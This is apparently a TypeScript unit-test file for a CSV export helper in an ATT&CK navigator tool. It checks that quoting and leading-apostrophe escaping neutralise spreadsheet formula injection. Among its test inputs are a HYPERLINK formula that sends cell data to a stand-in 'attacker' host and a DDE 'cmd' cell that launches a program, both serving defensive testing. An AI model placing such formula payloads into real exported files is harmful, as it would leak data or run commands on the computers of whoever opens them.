// ATTACK-Navi - Copyright (c) 2026 TeamStarWolf
// https://github.com/TeamStarWolf/ATTACK-Navi - MIT License
import { csvCell, csvRow, csvUnneutralise } from './csv';

describe('csvCell', () => {
  it('quotes plain strings', () => {
    expect(csvCell('Process Injection')).toBe('"Process Injection"');
  });

  it('doubles embedded quotes so a value cannot break out of its cell', () => {
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
  });

  it('keeps commas and newlines inside the quoted cell', () => {
    expect(csvCell('a,b\nc')).toBe('"a,b\nc"');
  });

  it('neutralises a leading "=" so spreadsheets show it as text', () => {
    expect(csvCell('=HYPERLINK("http://attacker/"&A1,"click")'))
      .toBe('"\'=HYPERLINK(""http://attacker/""&A1,""click"")"');
  });

  it('neutralises every formula-leading character', () => {
    expect(csvCell('+1+1')).toBe('"\'+1+1"');
    expect(csvCell('-2+3')).toBe('"\'-2+3"');
    expect(csvCell('@SUM(A1)')).toBe('"\'@SUM(A1)"');
    expect(csvCell('\t=1')).toBe('"\'\t=1"');
    expect(csvCell('\r=1')).toBe('"\'\r=1"');
  });

  it('neutralises a DDE / command cell', () => {
    expect(csvCell("=cmd|' /C calc'!A0")).toBe('"\'=cmd|\' /C calc\'!A0"');
  });

  it('does not touch a formula character that is not in the first position', () => {
    expect(csvCell('T1059 = Command and Scripting')).toBe('"T1059 = Command and Scripting"');
  });

  it('emits numbers and booleans bare', () => {
    expect(csvCell(7)).toBe('7');
    expect(csvCell(-3.5)).toBe('-3.5');
    expect(csvCell(true)).toBe('true');
  });

  it('turns null and undefined into an empty cell', () => {
    expect(csvCell(null)).toBe('""');
    expect(csvCell(undefined)).toBe('""');
    expect(csvCell('')).toBe('""');
  });
});

describe('csvRow', () => {
  it('joins cells with commas, applying csvCell to each', () => {
    expect(csvRow(['T1059', 'Command and Scripting', 3, '=1+1']))
      .toBe('"T1059","Command and Scripting",3,"\'=1+1"');
  });
});

describe('csvUnneutralise', () => {
  it('removes the apostrophe csvCell added in front of a formula character', () => {
    expect(csvUnneutralise("'=1+1")).toBe('=1+1');
    expect(csvUnneutralise("'-db01")).toBe('-db01');
    expect(csvUnneutralise("'@host")).toBe('@host');
  });

  it('keeps an apostrophe that is ordinary data', () => {
    expect(csvUnneutralise("'quoted'")).toBe("'quoted'");
    expect(csvUnneutralise("'")).toBe("'");
    expect(csvUnneutralise('plain')).toBe('plain');
  });
});
